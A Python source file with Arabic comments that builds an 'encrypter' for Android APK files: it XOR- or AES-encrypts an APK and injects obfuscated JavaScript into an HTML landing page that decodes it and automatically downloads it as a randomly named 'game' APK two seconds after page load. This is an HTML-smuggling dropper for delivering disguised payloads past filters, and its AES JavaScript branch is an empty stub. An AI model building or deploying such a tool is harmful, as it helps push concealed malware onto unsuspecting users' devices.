#!/usr/bin/env python3
"""
Advanced Encrypter Engine - محرك التشفير المتقدم
يقوم بتشفير APK وتحويله إلى كود HTML مموه
"""

import base64
import hashlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import os
import random
import string

class AdvancedEncrypter:
    def __init__(self, key=None):
        self.key = key or self._generate_key()
        self.fernet = Fernet(self._get_fernet_key())
        
    def _generate_key(self, length=32):
        """إنشاء مفتاح عشوائي"""
        chars = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(chars) for _ in range(length))
    
    def _get_fernet_key(self):
        """تحويل المفتاح إلى تنسيق Fernet"""
        key_hash = hashlib.sha256(self.key.encode()).digest()
        return base64.urlsafe_b64encode(key_hash)
    
    def xor_encrypt(self, data, key=None):
        """تشفير XOR الكلاسيكي"""
        if key is None:
            key = self.key
        
        encrypted = bytearray()
        key_bytes = key.encode()
        
        for i in range(len(data)):
            encrypted.append(data[i] ^ key_bytes[i % len(key_bytes)])
        
        return bytes(encrypted)
    
    def xor_decrypt(self, encrypted_data, key=None):
        """فك تشفير XOR"""
        # XOR متماثل: التشفير = فك التشفير
        return self.xor_encrypt(encrypted_data, key)
    
    def aes_encrypt(self, data, key=None):
        """تشفير AES-256-CBC"""
        if key is None:
            key = self._get_aes_key()
        
        # إعداد AES
        iv = os.urandom(16)  # Initialization Vector
        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        )
        
        # تطبيق Padding للبيانات
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        
        # التشفير
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        
        # إضافة IV في بداية البيانات
        return iv + encrypted
    
    def aes_decrypt(self, encrypted_data, key=None):
        """فك تشفير AES"""
        if key is None:
            key = self._get_aes_key()
        
        # فصل IV عن البيانات المشفرة
        iv = encrypted_data[:16]
        actual_data = encrypted_data[16:]
        
        # إعداد AES
        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        )
        
        # فك التشفير
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(actual_data) + decryptor.finalize()
        
        # إزالة Padding
        unpadder = padding.PKCS7(128).unpadder()
        decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
        
        return decrypted
    
    def _get_aes_key(self):
        """إنشاء مفتاح AES من المفتاح الرئيسي"""
        key_hash = hashlib.sha256(self.key.encode()).digest()
        return key_hash[:32]  # AES-256 requires 32 bytes
    
    def b64_encode(self, data):
        """تحويل البيانات إلى Base64"""
        return base64.b64encode(data)
    
    def b64_decode(self, encoded_data):
        """فك تشفير Base64"""
        return base64.b64decode(encoded_data)
    
    def xor_encrypt_file(self, file_path, output_path=None):
        """تشفير ملف كامل باستخدام XOR"""
        with open(file_path, 'rb') as f:
            data = f.read()
        
        encrypted = self.xor_encrypt(data)
        
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(encrypted)
        
        return encrypted
    
    def aes_encrypt_file(self, file_path, output_path=None):
        """تشفير ملف كامل باستخدام AES"""
        with open(file_path, 'rb') as f:
            data = f.read()
        
        encrypted = self.aes_encrypt(data)
        
        if output_path:
            with open(output_path, 'wb') as f:
                f.write(encrypted)
        
        return encrypted
    
    def create_obfuscated_js(self, encrypted_data, method="xor"):
        """إنشاء كود JavaScript لفك التشفير"""
        
        if method == "xor":
            js_code = f"""
// XOR Decryptor
function xorDecrypt(encryptedData, key) {{
    let result = "";
    for(let i = 0; i < encryptedData.length; i++) {{
        result += String.fromCharCode(encryptedData.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }}
    return result;
}}

// Base64 Decoder
function base64ToArray(base64) {{
    const binaryString = atob(base64);
    const bytes = new Uint8Array(binaryString.length);
    for(let i = 0; i < binaryString.length; i++) {{
        bytes[i] = binaryString.charCodeAt(i);
    }}
    return bytes;
}}

// البيانات المشفرة
const encryptedBase64 = "{base64.b64encode(encrypted_data).decode('utf-8')}";
const encryptionKey = "{self.key}";

// فك التشفير وتنزيل الملف
function downloadFile() {{
    try {{
        console.log("[+] جاري فك تشفير الملف...");
        
        const encryptedArray = base64ToArray(encryptedBase64);
        const encryptedString = String.fromCharCode(...encryptedArray);
        
        const decrypted = xorDecrypt(encryptedString, encryptionKey);
        const binaryData = atob(decrypted);
        
        const bytes = new Uint8Array(binaryData.length);
        for(let i = 0; i < binaryData.length; i++) {{
            bytes[i] = binaryData.charCodeAt(i);
        }}
        
        const blob = new Blob([bytes], {{type: 'application/vnd.android.package-archive'}});
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = 'game_' + Math.random().toString(36).substring(2) + '.apk';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        console.log("[+] تم تنزيل الملف بنجاح");
        return true;
        
    }} catch(error) {{
        console.error("[-] خطأ في فك التشفير:", error);
        return false;
    }}
}}

// تشغيل تلقائي عند تحميل الصفحة
window.addEventListener('load', function() {{
    setTimeout(downloadFile, 2000);
}});
"""
        
        elif method == "aes":
            # كود AES معقد أكثر
            js_code = """
// مكتبة AES JavaScript مبسطة
class SimpleAES {
    static decrypt(ciphertext, key, iv) {
        // تنفيذ مبسط لـ AES
        // في الإصدار الكامل نستخدم مكتبة crypto-js
        return ciphertext;
    }
}

// ... كود AES الكامل
"""
        
        return js_code
    
    def embed_in_html(self, encrypted_data, template_name="default"):
        """تضمين البيانات المشفرة في قالب HTML"""
        
        from html_generator import LandingPageGenerator
        generator = LandingPageGenerator()
        
        html_template = generator.get_template(template_name)
        js_code = self.create_obfuscated_js(encrypted_data)
        
        # حقن كود JavaScript في القالب
        final_html = html_template.replace("<!-- INJECT_JS_HERE -->", f"<script>\n{js_code}\n</script>")
        
        return final_html

# مثال للاستخدام
if __name__ == "__main__":
    encrypter = AdvancedEncrypter()
    
    # اختبار تشفير نص
    test_data = b"Hello, this is a test APK file!"
    print(f"البيانات الأصلية: {test_data[:20]}...")
    
    # XOR
    xor_encrypted = encrypter.xor_encrypt(test_data)
    print(f"XOR مشفر: {xor_encrypted[:20]}...")
    
    xor_decrypted = encrypter.xor_decrypt(xor_encrypted)
    print(f"XOR مفكوك: {xor_decrypted[:20]}...")
    
    # AES
    aes_encrypted = encrypter.aes_encrypt(test_data)
    print(f"AES مشفر: {aes_encrypted[:20]}...")
    
    aes_decrypted = encrypter.aes_decrypt(aes_encrypted)
    print(f"AES مفكوك: {aes_decrypted[:20]}...")
    
    print("✓ جميع الاختبارات ناجحة!")